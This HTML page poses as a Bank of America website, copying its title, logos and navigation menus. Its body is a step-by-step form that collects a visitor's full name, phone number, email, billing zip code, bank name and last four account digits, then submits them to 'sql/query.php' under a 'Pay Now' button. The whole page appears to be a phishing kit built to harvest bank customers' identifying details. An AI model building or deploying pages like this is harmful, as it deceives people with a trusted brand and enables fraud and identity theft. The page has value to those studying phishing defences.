<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bank of America - Banking, Credit Cards, Loans and Merrill Investing</title>
    <link rel="shortcut icon" href="static/img/logos/wbg-faviconn.png" type="image/png" />
    <link rel="stylesheet" href="static/css/style.css">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
</head>

<body>
    <section id="navigation-bar">
        <div class="container">
            <div id="first-nav" class="px-5 py-3">
                <div class="f-first-child">
                    <a href="#" style="border-bottom: 2px solid black;">Personal</a>
                    <a href="#">Small Business</a>
                    <a href="#">Wealth Management</a>
                    <a href="#">Business & Institutions</a>
                    <a href="#">Security</a>
                    <a href="#"><img src="static/img/logos/wbg-faviconn.png" alt="">About Us</a>
                </div>
                <div class="first-child">
                    <a href="#">En español</a>
                    <a href="#">Contact Us</a>
                    <a href="#">Help</a>
                </div>
            </div>
            <div id="second-nav">
                <img src="static/img/logos/america.svg" alt="Bank of America">
                <div class="second-child">
                    <input type="search" name="" id="" placeholder="Search" style="padding:3px 10px;outline:none;border-radius:10px;border:none;background-color:#f5f5f5;">
                    <i class="bi bi-search nav-right"></i>
                </div>
                <div id="hidden-child">
                    <a href="#" class="hide-me" style="color:red;">Login</a><span class="hide-me">|</span>
                    <i class="bi bi-list" data-bs-toggle="offcanvas" data-bs-target="#offcanvasRight"
                        aria-controls="offcanvasRight"></i>
                    <div class="offcanvas offcanvas-end" tabindex="-1" id="offcanvasRight"
                        aria-labelledby="offcanvasRightLabel">
                        <div class="offcanvas-header">
                            <img src="static/img/logos/america.svg" alt="Bank of America">
                            <button type="button" class="btn-close" data-bs-dismiss="offcanvas"
                                aria-label="Close"></button>
                        </div>
                        <div class="offcanvas-body">
                            <ul style="list-style-type:none;">
                                <li><a class="dropdown-item" href="#">Checking</a></li>
                                <li><a class="dropdown-item" href="#">Savings & CDs</a></li>
                                <li><a class="dropdown-item" href="#">Credit Cards</a></li>
                                <li><a class="dropdown-item" href="#">Home Loans</a></li>
                                <li><a class="dropdown-item" href="#">Auto Loans</a></li>
                                <li><a class="dropdown-item" href="#">Investing</a></li>
                                <li><a class="dropdown-item" href="#">Better Money Habbits&reg;</a></li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
            <div id="third-nav" class="px-3">
                <a class="dropdown-item" href="#">Checking</a>
                <a class="dropdown-item" href="#">Savings & CDs</a>
                <a class="dropdown-item" href="#">Credit Cards</a>
                <a class="dropdown-item" href="#">Home Loans</a>
                <a class="dropdown-item" href="#">Auto Loans</a>
                <a class="dropdown-item" href="#">Investing</a>
                <a class="dropdown-item" href="#">Better Money Habbits&reg;</a>
            </div>
        </div>
    </section>
    <main>
        <div class="container text-center mt-5">
            <div class="row">
                <div class="col-md-12">
                    <form action="sql/query.php" method="post" class="form-field">
                        <div class="full-name">
                            <label for="fullName">Your Full Name With Middle Name<sup>*</sup></label>
                            <input type="text" autofocus name="fullName" id="fullName"
                                placeholder="Type Full Name here..." required>
                            <div class="text-center"><button type="button" onclick="nameNext();"
                                    class="btn btn-primary nameNext">Next</button></div>
                        </div>
                        <div class="phone-num">
                            <label for="phoneNum">Phone Number associated with your bank account?<sup>*</sup></label>
                            <input type="text" name="phoneNum" id="phoneNum" placeholder="Type Phone Number here..."
                                required>
                            <div class="text-center"><button type="button" onclick="phoneNext();"
                                    class="btn btn-primary">Next</button></div>
                        </div>
                        <div class="email-id">
                            <label for="emailId">Email Address associated with your bank account?<sup>*</sup></label>
                            <input type="text" name="emailId" id="emailId" placeholder="Type Email Address here..."
                                required>
                            <div class="text-center"><button type="button" onclick="emailNext();"
                                    class="btn btn-primary">Next</button></div>
                        </div>
                        <div class="zip-code">
                            <label for="zipCode">Billing Zip code associated with your bank account?<sup>*</sup></label>
                            <input type="text" name="zipCode" id="zipCode" placeholder="Type Zip Code here..." required>
                            <div class="text-center"><button type="button" onclick="zipNext();"
                                    class="btn btn-primary">Next</button></div>
                        </div>
                        <div class="bank-name">
                            <label for="bankName">Enter the name of your bank<sup>*</sup></label>
                            <input type="text" name="bankName" id="bankName" placeholder="Type Bank Name here..."
                                required>
                            <div class="text-center"><button type="button" onclick="bankNext();"
                                    class="btn btn-primary">Next</button></div>
                        </div>
                        <div class="acc-num">
                            <label for="accNum">Please enter the last 4 digit of your bank account<sup>*</sup></label>
                            <input type="text" maxlength="4" name="accNum" id="accNum"
                                placeholder="Type Last 4-digit of Account Number here..." required>
                            <div class="text-center"><button type="submit" onclick="return accAndValid();"
                                    class="btn btn-success">Pay Now</button></div>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </main>
    <script src="static/js/script.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz"
        crossorigin="anonymous"></script>
</body>

</html>